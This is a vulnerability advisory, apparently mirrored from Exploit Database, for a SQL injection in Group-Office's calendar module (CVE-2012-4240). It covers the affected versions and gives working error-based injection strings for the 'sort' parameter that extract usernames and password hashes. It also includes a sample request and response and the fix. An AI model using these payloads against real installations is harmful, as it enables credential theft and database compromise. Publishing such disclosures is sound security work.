/-------------------------------------\
| Group-Office Calendar SQL Injection |
\-------------------------------------/

Summary
=======

Versions of Group-Office (a web app for online collaboration) prior to
4.0.90 are subject to a SQL injection vulnerability located in the calendar
module. A PHP file, used to serve data in the JSON format, does not
sufficiently sanitise a user-supplied parameter injected into the ORDER BY
part of an SQL query. An attacker can leverage this flaw to extract
information from the database via SQL errors.

CVE number: CVE-2012-4240
Impact: High

This advisory is posted at:

http://www.reactionpenetrationtesting.co.uk/group-office-sqli.html

Affected Products
======== ========

Confirmed in Group-Office community 4.0.71, 4.0.73 and 4.0.88. Other
versions may also be affected.

Details
=======

A 'sort' parameter on the page /modules/calendar/json.php was found to be
subject to a SQL injection vulnerability. It was possible to inject
arbitrary SQL statements into an ORDER BY clause, retrieving information
from the database via an error message. The attacker must be authenticated
as a valid user in order for the attack to be successful.

Injecting the following SQL code into the 'sort' parameter will trigger the
vulnerability, retrieving the first user's username. Changing 'username' to
'password' retrieves their hashed password. For version 4.0.71:

ExtractValue(1,CONCAT(0x5c,(SELECT username FROM go_users LIMIT 1)))

Or for versions 4.0.73 and 4.0.88:

id`,ExtractValue(1,CONCAT(0x5c,(SELECT username FROM go_users LIMIT 1)))#

---
Example Request (version 4.0.71):
+--------------------------------

POST /groupoffice/modules/calendar/json.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 162

Example Response (version 4.0.71):
+---------------------------------

HTTP/1.1 200 OK
Date: Fri, 20 Jul 2012 14:16:09 GMT

Content-Length: 397

{"feedback":"<b>Database error:<\/b> Invalid SQL: SELECT SQL_CALC_FOUND_ROWS
v.* FROM cal_views v INNER JOIN go_acl a ON (v.acl_id = a.acl_id AND
a.level>10 AND (a.user_id=1 OR a.group_id IN (1,2,3)))  GROUP BY v.id ORDER

LIMIT 0,20<br>\n<b>MySQL Error<\/b>: 1105 (XPATH syntax error:

Impact
======

An authenticated attacker might be able to take control of the database
within the context of the MySQL user, and potentially use this as leverage
to further compromise the host machine.

Solution
========

Upgrade to Group-Office community 4.0.90.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
